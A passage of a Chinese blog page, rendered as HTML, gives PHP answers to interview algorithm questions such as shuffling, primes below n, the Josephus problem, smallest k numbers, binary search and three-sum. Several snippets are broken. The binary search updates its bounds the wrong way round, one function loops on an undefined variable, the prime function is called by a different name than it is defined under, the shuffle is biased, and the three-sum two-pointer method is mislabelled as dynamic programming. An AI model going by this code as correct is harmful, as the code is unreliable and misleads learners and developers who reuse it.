class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">            <span class="variable">$i</span>++;</span><br><span class="line">            <span class="variable">$j</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array_unique(<span class="variable">$common</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-将一个数组中的元素随机（打乱）"><a href="#3-将一个数组中的元素随机（打乱）" class="headerlink" title="3.将一个数组中的元素随机（打乱）#"></a>3.将一个数组中的元素随机（打乱）<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzMlRTUlQjAlODYlRTQlQjglODAlRTQlQjglQUElRTYlOTUlQjAlRTclQkIlODQlRTQlQjglQUQlRTclOUElODQlRTUlODUlODMlRTclQjQlQTAlRTklOUElOEYlRTYlOUMlQkElRTYlODklOTMlRTQlQjklQjE=">#<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 打乱数组</span><br><span class="line"> * @param  <span class="keyword">array</span> <span class="variable">$arr</span> </span><br><span class="line"> * @<span class="keyword">return</span> <span class="keyword">array</span>      </span><br><span class="line"> */</span><br><span class="line"><span class="keyword">function</span> custom_shuffle(<span class="variable">$arr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$n</span> =<span class="built_in"> count</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$rand_pos</span> = mt_rand(<span class="number">0</span>, <span class="variable">$n</span> - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$rand_pos</span> != <span class="variable">$i</span>) &#123;</span><br><span class="line">            <span class="variable">$temp</span> = <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">            <span class="variable">$arr</span>[<span class="variable">$i</span>] = <span class="variable">$arr</span>[<span class="variable">$rand_pos</span>];</span><br><span class="line">            <span class="variable">$arr</span>[<span class="variable">$rand_pos</span>] = <span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$arr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-给一个有数字和字母的字符串，让连着的数字和字母对应"><a href="#4-给一个有数字和字母的字符串，让连着的数字和字母对应" class="headerlink" title="4.给一个有数字和字母的字符串，让连着的数字和字母对应#"></a>4.给一个有数字和字母的字符串，让连着的数字和字母对应<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzQlRTclQkIlOTklRTQlQjglODAlRTQlQjglQUElRTYlOUMlODklRTYlOTUlQjAlRTUlQUQlOTclRTUlOTIlOEMlRTUlQUQlOTclRTYlQUYlOEQlRTclOUElODQlRTUlQUQlOTclRTclQUMlQTYlRTQlQjglQjIlRTglQUUlQTklRTglQkYlOUUlRTclOUQlODAlRTclOUElODQlRTYlOTUlQjAlRTUlQUQlOTclRTUlOTIlOEMlRTUlQUQlOTclRTYlQUYlOEQlRTUlQUYlQjklRTUlQkElOTQ=">#<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">function number_alphabet(<span class="variable">$str</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$number</span> = preg_split(<span class="string">&#x27;/[a-z]+/&#x27;</span>, <span class="variable">$str</span>, -<span class="number">1</span>, <span class="variable constant_">PREG_SPLIT_NO_EMPTY</span>);</span><br><span class="line">    <span class="variable">$alphabet</span> = preg_split(<span class="string">&#x27;/\d+/&#x27;</span>, <span class="variable">$str</span>, -<span class="number">1</span>, <span class="variable constant_">PREG_SPLIT_NO_EMPTY</span>);</span><br><span class="line">    <span class="variable">$n</span> = count(<span class="variable">$number</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$count</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        echo <span class="variable">$number</span>[<span class="variable">$i</span>] . <span class="string">&#x27;:&#x27;</span> . <span class="variable">$alphabet</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;1a3bb44a2ac&#x27;</span>;</span><br><span class="line">number_alphabet(<span class="variable">$str</span>);<span class="regexp">//</span><span class="number">1</span><span class="symbol">:a</span> <span class="number">3</span><span class="symbol">:bb</span> <span class="number">44</span><span class="symbol">:a</span> <span class="number">2</span><span class="symbol">:ac</span></span><br></pre></td></tr></table></figure>

<h3 id="5-求n以内的质数（质数的定义：在大于1的自然数中，除了1和它本身意外，无法被其他自然数整除的数）"><a href="#5-求n以内的质数（质数的定义：在大于1的自然数中，除了1和它本身意外，无法被其他自然数整除的数）" class="headerlink" title="5.求n以内的质数（质数的定义：在大于1的自然数中，除了1和它本身意外，无法被其他自然数整除的数）#"></a>5.求n以内的质数（质数的定义：在大于1的自然数中，除了1和它本身意外，无法被其他自然数整除的数）<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzUlRTYlQjElODJuJUU0JUJCJUE1JUU1JTg2JTg1JUU3JTlBJTg0JUU4JUI0JUE4JUU2JTk1JUIwJUU4JUI0JUE4JUU2JTk1JUIwJUU3JTlBJTg0JUU1JUFFJTlBJUU0JUI5JTg5JUU1JTlDJUE4JUU1JUE0JUE3JUU0JUJBJThFMSVFNyU5QSU4NCVFOCU4NyVBQSVFNyU4NCVCNiVFNiU5NSVCMCVFNCVCOCVBRCVFOSU5OSVBNCVFNCVCQSU4NjElRTUlOTIlOEMlRTUlQUUlODMlRTYlOUMlQUMlRTglQkElQUIlRTYlODQlOEYlRTUlQTQlOTYlRTYlOTclQTAlRTYlQjMlOTUlRTglQTIlQUIlRTUlODUlQjYlRTQlQkIlOTYlRTglODclQUElRTclODQlQjYlRTYlOTUlQjAlRTYlOTUlQjQlRTklOTklQTQlRTclOUElODQlRTYlOTUlQjA=">#<i class="fa fa-external-link-alt"></i></span></h3><p>思路： 1.（质数筛选定理）n不能够被不大于根号n的任何质数整除，则n是一个质数<br>2.除了2的偶数都不是质数<br>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 求n内的质数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int $n </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_prime</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$prime</span> = <span class="keyword">array</span>(<span class="number">2</span>);<span class="comment">//2为质数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">3</span>; <span class="variable">$i</span> &lt;= <span class="variable">$n</span>; <span class="variable">$i</span> += <span class="number">2</span>) &#123;<span class="comment">//偶数不是质数，步长可以加大 </span></span><br><span class="line">        <span class="variable">$sqrt</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">sqrt</span>(<span class="variable">$i</span>));<span class="comment">//求根号n</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">3</span>; <span class="variable">$j</span> &lt;= <span class="variable">$sqrt</span>; <span class="variable">$j</span> += <span class="number">2</span>) &#123;<span class="comment">//i是奇数，当然不能被偶数整除，步长也可以加大。 </span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$i</span> % <span class="variable">$j</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$j</span> &gt; <span class="variable">$sqrt</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$prime</span>, <span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$prime</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">getPrime</span>(<span class="number">1000</span>));</span><br></pre></td></tr></table></figure>

<h3 id="6-约瑟夫环问题"><a href="#6-约瑟夫环问题" class="headerlink" title="6.约瑟夫环问题#"></a>6.约瑟夫环问题<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzYlRTclQkElQTYlRTclOTElOUYlRTUlQTQlQUIlRTclOEUlQUYlRTklOTclQUUlRTklQTIlOTg=">#<i class="fa fa-external-link-alt"></i></span></h3><p>相关题目：一群猴子排成一圈，按1,2,…,n依次编号。然后从第1只开始数，数到第m只,把它踢出圈，从它后面再开始数， 再数到第m只，在把它踢出去…，如此不停的进行下去， 直到最后只剩下一只猴子为止，那只猴子就叫做大王。要求编程模拟此过程，输入m、n, 输出最后那个大王的编号。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 获取大王</span><br><span class="line"> * @param  <span class="keyword">int</span> $n </span><br><span class="line"> * @param  <span class="keyword">int</span> $m </span><br><span class="line"> * @return <span class="keyword">int</span>  </span><br><span class="line"> */</span><br><span class="line">function get_king_mokey($n, $m) </span><br><span class="line">&#123;</span><br><span class="line">    $arr = range(<span class="number">1</span>, $n);</span><br><span class="line"></span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (count($arr) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        $i++;</span><br><span class="line">        $survice = array_shift($arr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($i % $m != <span class="number">0</span>) &#123;</span><br><span class="line">            array_push($arr, $survice);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="7-如何快速寻找一个数组里最小的1000个数"><a href="#7-如何快速寻找一个数组里最小的1000个数" class="headerlink" title="7.如何快速寻找一个数组里最小的1000个数#"></a>7.如何快速寻找一个数组里最小的1000个数<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzclRTUlQTYlODIlRTQlQkQlOTUlRTUlQkYlQUIlRTklODAlOUYlRTUlQUYlQkIlRTYlODklQkUlRTQlQjglODAlRTQlQjglQUElRTYlOTUlQjAlRTclQkIlODQlRTklODclOEMlRTYlOUMlODAlRTUlQjAlOEYlRTclOUElODQxMDAwJUU0JUI4JUFBJUU2JTk1JUIw">#<i class="fa fa-external-link-alt"></i></span></h3><p>思路：假设最前面的1000个数为最小的，算出这1000个数中最大的数，然后和第1001个数比较，如果这最大的数比这第1001个数小的话跳过，如果要比这第1001个数大则将两个数交换位置，并算出新的1000个数里面的最大数，再和下一个数比较，以此类推。<br>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//寻找最小的k个数</span></span><br><span class="line"><span class="comment">//题目描述</span></span><br><span class="line"><span class="comment">//输入n个整数，输出其中最小的k个。</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取最小的k个数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  array $arr </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  int $k   [description]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_min_array</span>(<span class="params"><span class="variable">$arr</span>, <span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$n</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$min_array</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span> &lt; <span class="variable">$k</span>) &#123;</span><br><span class="line">            <span class="variable">$min_array</span>[<span class="variable">$i</span>] = <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$i</span> == <span class="variable">$k</span>) &#123;</span><br><span class="line">                <span class="variable">$max_pos</span> = <span class="title function_ invoke__">get_max_pos</span>(<span class="variable">$min_array</span>);</span><br><span class="line">                <span class="variable">$max</span> = <span class="variable">$min_array</span>[<span class="variable">$max_pos</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="variable">$i</span>] &lt; <span class="variable">$max</span>) &#123;</span><br><span class="line">                <span class="variable">$min_array</span>[<span class="variable">$max_pos</span>] = <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line"></span><br><span class="line">                <span class="variable">$max_pos</span> = <span class="title function_ invoke__">get_max_pos</span>(<span class="variable">$min_array</span>);</span><br><span class="line">                <span class="variable">$max</span> = <span class="variable">$min_array</span>[<span class="variable">$max_pos</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$min_array</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取最大的位置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  array $arr </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_max_pos</span>(<span class="params"><span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$pos</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>); <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="variable">$i</span>] &gt; <span class="variable">$arr</span>[<span class="variable">$pos</span>]) &#123;</span><br><span class="line">            <span class="variable">$pos</span> = <span class="variable">$i</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$pos</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$array</span> = [<span class="number">1</span>, <span class="number">100</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">23</span>, <span class="number">79</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">129</span>, <span class="number">399</span>, <span class="number">145</span>, <span class="number">2469</span>, <span class="number">58</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$min_array</span> = <span class="title function_ invoke__">get_min_array</span>(<span class="variable">$array</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$min_array</span>);</span><br></pre></td></tr></table></figure>

<h3 id="8-如何在有序的数组中找到一个数的位置（二分查找）"><a href="#8-如何在有序的数组中找到一个数的位置（二分查找）" class="headerlink" title="8.如何在有序的数组中找到一个数的位置（二分查找）#"></a>8.如何在有序的数组中找到一个数的位置（二分查找）<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzglRTUlQTYlODIlRTQlQkQlOTUlRTUlOUMlQTglRTYlOUMlODklRTUlQkElOEYlRTclOUElODQlRTYlOTUlQjAlRTclQkIlODQlRTQlQjglQUQlRTYlODklQkUlRTUlODglQjAlRTQlQjglODAlRTQlQjglQUElRTYlOTUlQjAlRTclOUElODQlRTQlQkQlOEQlRTclQkQlQUUlRTQlQkElOEMlRTUlODglODYlRTYlOUYlQTUlRTYlODklQkU=">#<i class="fa fa-external-link-alt"></i></span></h3><p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 二分查找</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  array $array 数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  int $n 数组数量</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  int $value 要寻找的值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">binary_search</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$n</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$left</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$right</span> = <span class="variable">$n</span> - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$left</span> &lt;= <span class="variable">$right</span>) &#123;</span><br><span class="line">        <span class="variable">$mid</span> = <span class="title function_ invoke__">intval</span>((<span class="variable">$left</span> + <span class="variable">$right</span>) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$value</span> &gt; <span class="variable">$array</span>[<span class="variable">$mid</span>]) &#123;</span><br><span class="line">            <span class="variable">$right</span> = <span class="variable">$mid</span> + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$value</span> &lt; <span class="variable">$array</span>[<span class="variable">$mid</span>]) &#123;</span><br><span class="line">            <span class="variable">$left</span> = <span class="variable">$mid</span> - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$mid</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="9-给定一个有序整数序列，找出绝对值最小的元素"><a href="#9-给定一个有序整数序列，找出绝对值最小的元素" class="headerlink" title="9.给定一个有序整数序列，找出绝对值最小的元素#"></a>9.给定一个有序整数序列，找出绝对值最小的元素<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzklRTclQkIlOTklRTUlQUUlOUElRTQlQjglODAlRTQlQjglQUElRTYlOUMlODklRTUlQkElOEYlRTYlOTUlQjQlRTYlOTUlQjAlRTUlQkElOEYlRTUlODglOTclRTYlODklQkUlRTUlODclQkElRTclQkIlOUQlRTUlQUYlQjklRTUlODAlQkMlRTYlOUMlODAlRTUlQjAlOEYlRTclOUElODQlRTUlODUlODMlRTclQjQlQTA=">#<i class="fa fa-external-link-alt"></i></span></h3><p>思路：二分查找</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取绝对值最小的元素</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  array $arr</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_min_abs_value</span>(<span class="params"><span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$n</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="comment">//如果符号相同，直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_same_sign</span>(<span class="variable">$arr</span>[<span class="number">0</span>], <span class="variable">$arr</span>[<span class="variable">$n</span> - <span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$arr</span>[<span class="number">0</span>] &gt;= <span class="number">0</span> ? <span class="variable">$arr</span>[<span class="number">0</span>] : <span class="variable">$arr</span>[<span class="variable">$n</span> - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//二分查找</span></span><br><span class="line">    <span class="variable">$left</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$right</span> = <span class="variable">$n</span> - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$left</span> &lt;= <span class="variable">$right</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$left</span> + <span class="number">1</span> === <span class="variable">$right</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">abs</span>(<span class="variable">$arr</span>[<span class="variable">$left</span>]) &lt; <span class="title function_ invoke__">abs</span>(<span class="variable">$arr</span>[<span class="variable">$right</span>]) ? <span class="variable">$arr</span>[<span class="variable">$left</span>] : <span class="variable">$arr</span>[<span class="variable">$right</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$mid</span> = <span class="title function_ invoke__">intval</span>((<span class="variable">$left</span> + <span class="variable">$right</span>) / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="variable">$mid</span>] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$left</span> = <span class="variable">$mid</span> + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$right</span> = <span class="variable">$mid</span> - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断符号是否相同</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  int  $a </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  int  $b </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> boolean  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_same_sign</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> * <span class="variable">$b</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="10-找出有序数组中随机3个数和为0的所有情况"><a href="#10-找出有序数组中随机3个数和为0的所有情况" class="headerlink" title="10.找出有序数组中随机3个数和为0的所有情况#"></a>10.找出有序数组中随机3个数和为0的所有情况<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzEwJUU2JTg5JUJFJUU1JTg3JUJBJUU2JTlDJTg5JUU1JUJBJThGJUU2JTk1JUIwJUU3JUJCJTg0JUU0JUI4JUFEJUU5JTlBJThGJUU2JTlDJUJBMyVFNCVCOCVBQSVFNiU5NSVCMCVFNSU5MiU4QyVFNCVCOCVCQTAlRTclOUElODQlRTYlODklODAlRTYlOUMlODklRTYlODMlODUlRTUlODYlQjU=">#<i class="fa fa-external-link-alt"></i></span></h3><p>思路：动态规划</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">three_sum</span>(<span class="params"><span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$n</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$return</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="variable">$left</span> = <span class="variable">$i</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$right</span> = <span class="variable">$n</span> - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$left</span> &lt;= <span class="variable">$right</span>) &#123;</span><br><span class="line">            <span class="variable">$sum</span> = <span class="variable">$arr</span>[<span class="variable">$i</span>] + <span class="variable">$arr</span>[<span class="variable">$left</span>] + <span class="variable">$arr</span>[<span class="variable">$right</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$sum</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="variable">$left</span>++;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="variable">$sum</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="variable">$right</span>--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$numbers</span> = <span class="variable">$arr</span>[<span class="variable">$i</span>] . <span class="string">&#x27;,&#x27;</span> . <span class="variable">$arr</span>[<span class="variable">$left</span>] . <span class="string">&#x27;,&#x27;</span> . <span class="variable">$arr</span>[<span class="variable">$right</span>];</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$numbers</span>, <span class="variable">$return</span>)) &#123;</span><br><span class="line">                    <span class="variable">$return</span>[] = <span class="variable">$numbers</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$left</span>++;</span><br><span class="line">                <span class="variable">$right</span>--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = [-<span class="number">10</span>, -<span class="number">9</span>, -<span class="number">8</span>, -<span class="number">4</span>, -<span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">three_sum</span>(<span class="variable">$arr</span>));</span><br></pre></td></tr></table></figure>

